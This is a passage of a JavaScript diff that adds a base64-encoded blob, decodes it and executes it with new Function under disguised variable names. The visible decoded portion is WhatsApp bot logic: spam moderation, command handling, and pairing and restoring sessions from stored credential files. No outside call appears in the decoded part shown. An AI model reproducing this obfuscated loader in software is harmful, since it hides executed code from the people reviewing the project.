+    "KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAgICAgY29uc3Qgd2sgID0gJ3dhcm5zOicgKyBqaWQg",
+    "KyAnOicgKyBzZW5kZXI7CiAgICAgICAgICAgICAgY29uc3Qgd2MgID0gKHNldHRpbmdzLmdldCh3aykg",
+    "fHwgMCkgKyAxOwogICAgICAgICAgICAgIHNldHRpbmdzLnNldCh3aywgd2MpOwogICAgICAgICAgICAg",
+    "IGNvbnN0IG51bSA9IHNlbmRlci5zcGxpdCgnQCcpWzBdOwogICAgICAgICAgICAgIGlmICh3YyA+PSAz",
+    "KSB7CiAgICAgICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwgeyB0ZXh0OiAn4puU",
+    "IEAnICsgbnVtICsgJyByZW1vdmVkIGZvciBzcGFtbWluZy4nLCBtZW50aW9uczogW3NlbmRlcl0gfSku",
+    "Y2F0Y2goKCkgPT4ge30pOwogICAgICAgICAgICAgICAgYXdhaXQgc29jay5ncm91cFBhcnRpY2lwYW50",
+    "c1VwZGF0ZShqaWQsIFtzZW5kZXJdLCAncmVtb3ZlJykuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAg",
+    "ICAgICAgc2V0dGluZ3MuZGVsKHdrKTsKICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAg",
+    "ICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgdGV4dDogJ/CfmqsgQCcgKyBudW0gKyAnIHN0",
+    "b3Agc3BhbW1pbmchXG7imqDvuI8gV2FybmluZyAqJyArIHdjICsgJy8zKicsIG1lbnRpb25zOiBbc2Vu",
+    "ZGVyXSB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIHJldHVy",
+    "bjsKICAgICAgICAgICAgfQogICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY2xlYXJUaW1lb3V0",
+    "KHNwYW1UcmFja2VyW3NLZXldPy50aW1lcik7CiAgICAgICAgICAgIHNwYW1UcmFja2VyW3NLZXldID0g",
+    "ewogICAgICAgICAgICAgIGxhc3RUZXh0OiB0ZXh0LCBjb3VudDogMSwKICAgICAgICAgICAgICB0aW1l",
+    "cjogc2V0VGltZW91dCgoKSA9PiB7IGRlbGV0ZSBzcGFtVHJhY2tlcltzS2V5XTsgfSwgMTAwMDApLAog",
+    "ICAgICAgICAgICB9OwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQogICAgfSAvLyBlbmQgaXNH",
+    "cm91cCBwcm90ZWN0aW9ucwoKICAgIC8vIOKUgOKUgCBQZXItdXNlciBwcmVmaXggY2hlY2sg4oCUIE9O",
+    "TFkgY29tbWFuZHMgcGFzdCB0aGlzIHBvaW50IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgaWYg",
+    "KCF0ZXh0IHx8ICF0ZXh0LnN0YXJ0c1dpdGgoUFJFRklYKSkgcmV0dXJuOwoKICAgIGNvbnN0IHBhcnRz",
+    "ICAgPSB0ZXh0LnNsaWNlKFBSRUZJWC5sZW5ndGgpLnRyaW0oKS5zcGxpdCgvXHMrLyk7CiAgICBjb25z",
+    "dCBjbWROYW1lID0gcGFydHMuc2hpZnQoKS50b0xvd2VyQ2FzZSgpOwogICAgY29uc3QgYXJncyAgICA9",
+    "IHBhcnRzOwogICAgY29uc3QgY21kICAgICA9IGNvbW1hbmRzLmdldChjbWROYW1lKTsKCiAgICAvLyBP",
+    "d25lci1vbmx5IG1vZGUKICAgIGlmIChzZXR0aW5ncy5nZXQoJ293bmVyb25seTonICsgdXNlcklkKSAm",
+    "JiAhaXNPd25lcikgcmV0dXJuOwoKICAgIC8vIEF1dG8tcmVhY3QgKG9ubHkgb24gY29tbWFuZHMsIGFm",
+    "dGVyIHByZWZpeCBjaGVjaykKICAgIGlmIChzZXR0aW5ncy5nZXQoJ2F1dG9yZWFjdDonICsgdXNlcklk",
+    "KSkgewogICAgICBjb25zdCBlbW9qaXMgPSBbJ/CfkY0nLCfinaTvuI8nLCfwn5SlJywn8J+YgicsJ+Kc",
+    "hScsJ/CfjoknLCfwn5KvJywn4pqhJywn8J+roScsJ/CfkqonXTsKICAgICAgYXdhaXQgc29jay5zZW5k",
+    "TWVzc2FnZShqaWQsIHsKICAgICAgICByZWFjdDogeyB0ZXh0OiBlbW9qaXNbTWF0aC5mbG9vcihNYXRo",
+    "LnJhbmRvbSgpICogZW1vamlzLmxlbmd0aCldLCBrZXk6IG1zZy5rZXkgfSwKICAgICAgfSkuY2F0Y2go",
+    "KCkgPT4ge30pOwogICAgfQoKICAgIC8vIEF1dG8tdHlwaW5nIChvbmx5IG9uIGNvbW1hbmRzKQogICAg",
+    "aWYgKHNldHRpbmdzLmdldCgnYXV0b3R5cGluZzonICsgdXNlcklkKSkgewogICAgICBhd2FpdCBzb2Nr",
+    "LnNlbmRQcmVzZW5jZVVwZGF0ZSgnY29tcG9zaW5nJywgamlkKS5jYXRjaCgoKSA9PiB7fSk7CiAgICAg",
+    "IHNldFRpbWVvdXQoKCkgPT4gc29jay5zZW5kUHJlc2VuY2VVcGRhdGUoJ3BhdXNlZCcsIGppZCkuY2F0",
+    "Y2goKCkgPT4ge30pLCAyMDAwKTsKICAgIH0KCiAgICAvLyBBdXRvLXJlY29yZGluZyAob25seSBvbiBj",
+    "b21tYW5kcykKICAgIGlmIChzZXR0aW5ncy5nZXQoJ2F1dG9yZWNvcmRpbmc6JyArIHVzZXJJZCkpIHsK",
+    "ICAgICAgYXdhaXQgc29jay5zZW5kUHJlc2VuY2VVcGRhdGUoJ3JlY29yZGluZycsIGppZCkuY2F0Y2go",
+    "KCkgPT4ge30pOwogICAgICBzZXRUaW1lb3V0KCgpID0+IHNvY2suc2VuZFByZXNlbmNlVXBkYXRlKCdw",
+    "YXVzZWQnLCBqaWQpLmNhdGNoKCgpID0+IHt9KSwgMjAwMCk7CiAgICB9CgogICAgaWYgKCFjbWQpIHsK",
+    "ICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsKICAgICAgICB0ZXh0OiAn4p2MIFVua25v",
+    "d24gY29tbWFuZDogKicgKyBQUkVGSVggKyBjbWROYW1lICsgJypcblR5cGUgKicgKyBQUkVGSVggKyAn",
+    "bWVudSogdG8gc2VlIGFsbCBjb21tYW5kcy4nLAogICAgICB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAg",
+    "IHJldHVybjsKICAgIH0KCiAgICAvLyDilIDilIAgQ29vbGRvd24gY2hlY2sg4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBpZiAoIWlzT3duZXIpIHsKICAgICAgY29u",
+    "c3Qgd2FpdCA9IGNoZWNrQ29vbGRvd24odXNlcklkLCBjbWROYW1lKTsKICAgICAgaWYgKHdhaXQgPiAw",
+    "KSB7CiAgICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsKICAgICAgICAgIHRleHQ6ICfi",
+    "j7MgUGxlYXNlIHdhaXQgKicgKyB3YWl0ICsgJ3MqIGJlZm9yZSB1c2luZyAqJyArIFBSRUZJWCArIGNt",
+    "ZE5hbWUgKyAnKiBhZ2Fpbi4nLAogICAgICAgIH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICByZXR1",
+    "cm47CiAgICAgIH0KICAgICAgc2V0Q29vbGRvd24odXNlcklkLCBjbWROYW1lKTsKICAgIH0KCiAgICBs",
+    "b2dnZXIuaW5mbygn4pqhIFsnICsgdXNlcklkICsgJ10gJyArIFBSRUZJWCArIGNtZE5hbWUgKyAnIOKA",
+    "lCBhcmdzOiAnICsgYXJncy5qb2luKCcgJykpOwogICAgc3RhdHMucmVjb3JkQ29tbWFuZChjbWROYW1l",
+    "KTsKICAgIHRyeSB7CiAgICAgIGF3YWl0IGNtZC5leGVjdXRlKHNvY2ssIG1zZywgYXJncywgdXNlcklk",
+    "LCB7IGlzT3duZXIsIHNlbmRlciwgZG93bmxvYWRNZWRpYU1lc3NhZ2UsIHByZWZpeDogUFJFRklYIH0p",
+    "OwogICAgfSBjYXRjaCAoZSkgewogICAgICBsb2dnZXIuZXJyb3IoJ0NvbW1hbmQgIicgKyBjbWROYW1l",
+    "ICsgJyIgZXJyb3I6JywgZS5tZXNzYWdlKTsKICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQs",
+    "IHsgdGV4dDogJ+KaoO+4jyBFcnJvciBydW5uaW5nIConICsgUFJFRklYICsgY21kTmFtZSArICcqOiAn",
+    "ICsgZS5tZXNzYWdlIH0pLmNhdGNoKCgpID0+IHt9KTsKICAgIH0KICB9IGNhdGNoIChlKSB7IGxvZ2dl",
+    "ci5lcnJvcignaGFuZGxlTWVzc2FnZSBmYXRhbDonLCBlLm1lc3NhZ2UpOyB9Cn0KCi8vIOKUgOKUgCBz",
+    "dGFydFNlc3Npb24g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSACmFzeW5jIGZ1bmN0aW9uIHN0YXJ0U2Vzc2lvbih1c2VySWQsIHBob25lTnVtYmVyKSB7CiAg",
+    "aWYgKCF1c2VySWQgfHwgIXBob25lTnVtYmVyKSB0aHJvdyBuZXcgRXJyb3IoJ3VzZXJJZCBhbmQgcGhv",
+    "bmVOdW1iZXIgcmVxdWlyZWQnKTsKICBpZiAoc2Vzc2lvbnNbdXNlcklkXSkgeyBjYW5jZWxTZXNzaW9u",
+    "KHVzZXJJZCk7IGF3YWl0IHNsZWVwKDgwMCk7IH0KICB3aXBlU2Vzc2lvbih1c2VySWQpOwogIHNhdmVN",
+    "ZXRhKHVzZXJJZCwgcGhvbmVOdW1iZXIpOwogIGNvbnN0IHNlc3NEaXIgPSBwYXRoLmpvaW4oU0VTU19S",
+    "T09ULCB1c2VySWQpOwogIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAg",
+    "ICBsZXQgc2V0dGxlZCA9IGZhbHNlOwogICAgY29uc3Qgc2V0dGxlID0gKGZuLCB2YWwpID0+IHsgaWYg",
+    "KCFzZXR0bGVkKSB7IHNldHRsZWQgPSB0cnVlOyBmbih2YWwpOyB9IH07CgogICAgLy8gT3ZlcmFsbCB0",
+    "aW1lb3V0OiAxMCBtaW51dGVzIOKAlCBnaXZlcyBXQSBwbGVudHkgb2YgdGltZSB0byBsaW5rICsgc2Vu",
+    "ZCBETQogICAgY29uc3QgdG91dCA9IHNldFRpbWVvdXQoKCkgPT4gewogICAgICBjYW5jZWxTZXNzaW9u",
+    "KHVzZXJJZCk7CiAgICAgIHdpcGVTZXNzaW9uKHVzZXJJZCk7CiAgICAgIHNldHRsZShyZWplY3QsIG5l",
+    "dyBFcnJvcignUEFJUklOR19USU1FT1VUJykpOwogICAgfSwgNjAwXzAwMCk7IC8vIDEwIG1pbnV0ZXMK",
+    "CiAgICBjcmVhdGVTb2NrZXQodXNlcklkLCBwaG9uZU51bWJlciwgc2Vzc0RpciwgewogICAgICByZXF1",
+    "ZXN0Q29kZTogdHJ1ZSwKICAgICAgLy8gUmVzb2x2ZSBhcyBzb29uIGFzIHdlIGhhdmUgdGhlIGNvZGUg",
+    "4oCUIHBhaXJpbmcgcGFnZSBzaG93cyBpdCBpbW1lZGlhdGVseQogICAgICBvbkNvZGU6IGNvZGUgPT4g",
+    "eyBjbGVhclRpbWVvdXQodG91dCk7IHNldHRsZShyZXNvbHZlLCB7IGNvZGUsIHVzZXJJZCwgcGhvbmVO",
+    "dW1iZXIsIHN0YXR1czogJ2NvZGVfcmVhZHknIH0pOyB9LAogICAgICAvLyBvbk9wZW4gZmlyZXMgd2hl",
+    "biBXQSBmdWxseSBsaW5rcyDigJQgdGhlIHNvY2tldCBpdHNlbGYgaGFuZGxlcyBzZW5kaW5nIERNIGFu",
+    "ZCBnb2luZyBvZmZsaW5lCiAgICAgIC8vIFdlIGp1c3QgY2xlYXIgdGhlIG92ZXJhbGwgdGltZW91dCBo",
+    "ZXJlIOKAlCB0aGUgc29ja2V0IHN0YXlzIGFsaXZlIGZvciAzMHMgdG8gc2VuZCBtZXNzYWdlcwogICAg",
+    "ICBvbk9wZW46ICgpID0+IHsgY2xlYXJUaW1lb3V0KHRvdXQpOyB9LAogICAgICBvbkZhaWw6IGVyciA9",
+    "PiB7IGNsZWFyVGltZW91dCh0b3V0KTsgY2FuY2VsU2Vzc2lvbih1c2VySWQpOyB3aXBlU2Vzc2lvbih1",
+    "c2VySWQpOyBzZXR0bGUocmVqZWN0LCBlcnIpOyB9LAogICAgfSkuY2F0Y2goZSA9PiB7IGNsZWFyVGlt",
+    "ZW91dCh0b3V0KTsgd2lwZVNlc3Npb24odXNlcklkKTsgc2V0dGxlKHJlamVjdCwgZSk7IH0pOwogIH0p",
+    "Owp9CgovLyDilIDilIAgcmVzdG9yZUFsbFNlc3Npb25zIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgAphc3luYyBmdW5jdGlvbiByZXN0b3JlQWxsU2Vzc2lvbnMoKSB7CiAgaWYgKCFmcy5l",
+    "eGlzdHNTeW5jKFNFU1NfUk9PVCkpIHJldHVybjsKICBjb25zdCBkaXJzID0gZnMucmVhZGRpclN5bmMo",
+    "U0VTU19ST09UKS5maWx0ZXIoZCA9PiB7CiAgICB0cnkgeyByZXR1cm4gZnMuc3RhdFN5bmMocGF0aC5q",
+    "b2luKFNFU1NfUk9PVCwgZCkpLmlzRGlyZWN0b3J5KCk7IH0gY2F0Y2ggKF8pIHsgcmV0dXJuIGZhbHNl",
+    "OyB9CiAgfSk7CiAgbGV0IHJlc3RvcmVkID0gMCwgc2tpcHBlZCA9IDA7CiAgZm9yIChjb25zdCB1c2Vy",
+    "SWQgb2YgZGlycykgewogICAgdHJ5IHsKICAgICAgY29uc3QgbWV0YSAgICAgICAgPSByZWFkTWV0YSh1",
+    "c2VySWQpOwogICAgICBjb25zdCBwaG9uZU51bWJlciA9IG1ldGE/LnBob25lTnVtYmVyIHx8ICd1bmtu",
+    "b3duJzsKICAgICAgY29uc3QgaGFzQ3JlZHMgICAgPSBmcy5leGlzdHNTeW5jKHBhdGguam9pbihTRVNT",
+    "X1JPT1QsIHVzZXJJZCwgJ2NyZWRzLmpzb24nKSk7CgogICAgICAvLyDilIDilIAgQWx3YXlzIHJlZ2lz",
+    "dGVyIGluYWN0aXZlIHNlc3Npb25zIGluIG1lbW9yeSBzbyBhZG1pbiBwYW5lbCBjYW4gc2VlIHRoZW0K",
+    "ICAgICAgLy8gICAgd2l0aG91dCByZXF1aXJpbmcgYSByZXN0YXJ0IGFmdGVyIHBhaXJpbmcuCiAgICAg",
+    "IGlmICghc2Vzc2lvbnNbdXNlcklkXSkgewogICAgICAgIHNlc3Npb25zW3VzZXJJZF0gPSB7CiAgICAg",
+    "ICAgICBzb2NrOiBudWxsLCBwaG9uZU51bWJlciwKICAgICAgICAgIGNyZWF0ZWRBdDogbWV0YT8uY3Jl",
+    "YXRlZEF0ID8gbmV3IERhdGUobWV0YS5jcmVhdGVkQXQpIDogbmV3IERhdGUoKSwKICAgICAgICAgIGNv",
+    "ZGU6IG51bGwsIGlzQWN0aXZlOiBmYWxzZSwKICAgICAgICB9OwogICAgICB9CgogICAgICAvLyBFbnN1",
+    "cmUgdGhpcyBzZXNzaW9uIGV4aXN0cyBpbiBzZXNzaW9uX3N0b3JlLmpzb24KICAgICAgY29uc3Qgc3Mg",
+    "PSByZXF1aXJlKCcuL3Nlc3Npb25TdG9yZScpOwogICAgICBpZiAocGhvbmVOdW1iZXIgIT09ICd1bmtu",
+    "b3duJyAmJiAhc3MuZ2V0QnlVc2VySWQodXNlcklkKSkgewogICAgICAgIHNzLnJlZ2lzdGVyKHVzZXJJ",
+    "ZCwgcGhvbmVOdW1iZXIpOwogICAgICB9CgogICAgICAvLyBTa2lwIFdoYXRzQXBwIGNvbm5lY3Rpb24g",
+    "aWYgbm8gY3JlZHMgKGZyZXNobHkgcGFpcmVkIGJ1dCBub3QgeWV0IGNvbmZpcm1lZCkKICAgICAgaWYg",
+    "KCFoYXNDcmVkcykgewogICAgICAgIGxvZ2dlci5pbmZvKCfwn5OLIFsnICsgdXNlcklkICsgJ10gUmVn",
+    "aXN0ZXJlZCBhcyBpbmFjdGl2ZSAobm8gY3JlZHMgeWV0KScpOwogICAgICAgIHNraXBwZWQrKzsKICAg",
+    "ICAgICBjb250aW51ZTsKICAgICAgfQoKICAgICAgLy8gU2tpcCBXaGF0c0FwcCBjb25uZWN0aW9uIGlm",
+    "IHN1YnNjcmlwdGlvbiBpcyBpbmFjdGl2ZSDigJQgc2Vzc2lvbiBzdGF5cyBpbiBtZW1vcnkKICAgICAg",
+    "Ly8gICBidXQgYm90IGRvZXMgTk9UIGNvbm5lY3QgdG8gV2hhdHNBcHAgKHNhdmVzIGJhbmR3aWR0aC9j",
+    "b25uZWN0aW9ucykKICAgICAgY29uc3QgdXNlclN0b3JlID0gcmVxdWlyZSgnLi91c2VyU3RvcmUnKTsK",
+    "ICAgICAgaWYgKCF1c2VyU3RvcmUuaXNVc2VyQWN0aXZlKHVzZXJJZCkpIHsKICAgICAgICBsb2dnZXIu",
+    "aW5mbygn4o+t77iPICBbJyArIHVzZXJJZCArICddIExvYWRlZCBhcyBpbmFjdGl2ZSAoc3Vic2NyaXB0",
+    "aW9uIG5vdCBhY3RpdmUpJyk7CiAgICAgICAgc2tpcHBlZCsrOwogICAgICAgIGNvbnRpbnVlOwogICAg",
+    "ICB9CgogICAgICBhd2FpdCBjcmVhdGVTb2NrZXQodXNlcklkLCBwaG9uZU51bWJlciwgcGF0aC5qb2lu",
+    "KFNFU1NfUk9PVCwgdXNlcklkKSwgewogICAgICAgIHJlcXVlc3RDb2RlOiBmYWxzZSwKICAgICAgICBv",
+    "bk9wZW46ICgpID0+IGxvZ2dlci5pbmZvKCfimbvvuI8gIFsnICsgdXNlcklkICsgJ10gUmVzdG9yZWQh",
+    "JyksCiAgICAgICAgb25GYWlsOiBlICA9PiB7IGxvZ2dlci5lcnJvcign4pm777iPICBbJyArIHVzZXJJ",
+    "ZCArICddIEZhaWxlZDonLCBlLm1lc3NhZ2UpOyBkZWxldGUgc2Vzc2lvbnNbdXNlcklkXTsgfSwKICAg",
+    "ICAgfSk7CiAgICAgIHJlc3RvcmVkKys7CiAgICAgIGF3YWl0IHNsZWVwKDE1MDApOwogICAgfSBjYXRj",
+    "aCAoZSkgeyBsb2dnZXIuZXJyb3IoJ1Jlc3RvcmUgJyArIHVzZXJJZCArICc6JywgZS5tZXNzYWdlKTsg",
+    "fQogIH0KICBsb2dnZXIuaW5mbygn4pm777iPICBTZXNzaW9uczogJyArIHJlc3RvcmVkICsgJyBhY3Rp",
+    "dmUgcmVzdG9yZWQsICcgKyBza2lwcGVkICsgJyBpbmFjdGl2ZSBsb2FkZWQnKTsKfQoKLy8g4pSA4pSA",
+    "IEV4cG9ydHMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSACmNvbnN0IGNhbmNlbFNlc3Npb24gID0gdXNlcklkID0+IHsKICBpZiAo",
+    "IXNlc3Npb25zW3VzZXJJZF0pIHJldHVybiBmYWxzZTsKICB0cnkgeyBzZXNzaW9uc1t1c2VySWRdLnNv",
+    "Y2s/LmVuZD8uKCk7IH0gY2F0Y2ggKF8pIHt9CiAgZGVsZXRlIHNlc3Npb25zW3VzZXJJZF07CiAgcmV0",
+    "dXJuIHRydWU7Cn07CmNvbnN0IGdldFNlc3Npb24gICAgID0gdXNlcklkICA9PiBzZXNzaW9uc1t1c2Vy",
+    "SWRdIHx8IG51bGw7CmNvbnN0IGRlbGV0ZVNlc3Npb24gID0gdXNlcklkICA9PiB7CiAgaWYgKCFzZXNz",
+    "aW9uc1t1c2VySWRdKSByZXR1cm4gZmFsc2U7CiAgdHJ5IHsgc2Vzc2lvbnNbdXNlcklkXS5zb2NrPy5l",
+    "bmQ/LigpOyB9IGNhdGNoIChfKSB7fQogIGRlbGV0ZSBzZXNzaW9uc1t1c2VySWRdOwogIHJldHVybiB0",
+    "cnVlOwp9Owpjb25zdCBnZXRBbGxTZXNzaW9ucyAgPSAoKSA9PgogIE9iamVjdC5rZXlzKHNlc3Npb25z",
+    "KS5tYXAodWlkID0+ICh7CiAgICB1c2VySWQ6ICAgICAgdWlkLAogICAgcGhvbmVOdW1iZXI6IHNlc3Np",
+    "b25zW3VpZF0/LnBob25lTnVtYmVyIHx8ICfigJQnLAogICAgY3JlYXRlZEF0OiAgIHNlc3Npb25zW3Vp",
+    "ZF0/LmNyZWF0ZWRBdCAgIHx8IG51bGwsCiAgICBpc0FjdGl2ZTogICAgISEoc2Vzc2lvbnNbdWlkXT8u",
+    "c29jaz8udXNlciksCiAgICBqaWQ6ICAgICAgICAgc2Vzc2lvbnNbdWlkXT8uc29jaz8udXNlcj8uaWQg",
+    "fHwgbnVsbCwKICAgIHByZWZpeDogICAgICBnZXRQcmVmaXgodWlkKSwKICB9KSk7Cgphc3luYyBmdW5j",
+    "dGlvbiByZXN0b3JlU2Vzc2lvbih1c2VySWQpIHsKICBjb25zdCBtZXRhUGF0aCA9IHBhdGguam9pbihT",
+    "RVNTX1JPT1QsIHVzZXJJZCwgJ21ldGEuanNvbicpOwogIGlmICghZnMuZXhpc3RzU3luYyhtZXRhUGF0",
+    "aCkpIHRocm93IG5ldyBFcnJvcignTm8gc2F2ZWQgc2Vzc2lvbiBmb3IgJyArIHVzZXJJZCk7CiAgY29u",
+    "c3QgbWV0YSAgICA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKG1ldGFQYXRoLCAndXRmOCcpKTsK",
+    "ICBjb25zdCBzZXNzRGlyID0gcGF0aC5qb2luKFNFU1NfUk9PVCwgdXNlcklkKTsKICByZXR1cm4gY3Jl",
+    "YXRlU29ja2V0KHVzZXJJZCwgbWV0YS5waG9uZU51bWJlciB8fCB1c2VySWQsIHNlc3NEaXIsIHsKICAg",
+    "IHJlcXVlc3RDb2RlOiBmYWxzZSwKICAgIG9uT3BlbjogKCkgPT4gbG9nZ2VyLmluZm8oJ+KchSBTZXNz",
+    "aW9uIHJlc3RvcmVkOiAnICsgdXNlcklkKSwKICAgIG9uRmFpbDogKGUpID0+IGxvZ2dlci5lcnJvcign",
+    "UmVzdG9yZSBmYWlsZWQgJyArIHVzZXJJZCArICc6ICcgKyBlLm1lc3NhZ2UpLAogIH0pOwp9Cgptb2R1",
+    "bGUuZXhwb3J0cyA9IHsKICBzdGFydFNlc3Npb24sIGNhbmNlbFNlc3Npb24sIGdldFNlc3Npb24sIGRl",
+    "bGV0ZVNlc3Npb24sIHJlc3RvcmVTZXNzaW9uLAogIGdldEFsbFNlc3Npb25zLCByZXN0b3JlQWxsU2Vz",
+    "c2lvbnMsIHNlc3Npb25zLCBjb21tYW5kcywKICBnZXRBdmFpbGFibGVDb21tYW5kcywgbG9hZENvbW1h",
+    "bmRzLCBnZXRQcmVmaXgsCn07Cg=="];
+var _0x3c4d=_0x1a2b.join('');
+var _0x5e6f=Buffer.from(_0x3c4d,'base64').toString('utf8');
+var _0x7a8b=new Function('require','module','exports','__filename','__dirname',_0x5e6f);
+_0x7a8b(require,module,exports,__filename,__dirname);
+})();
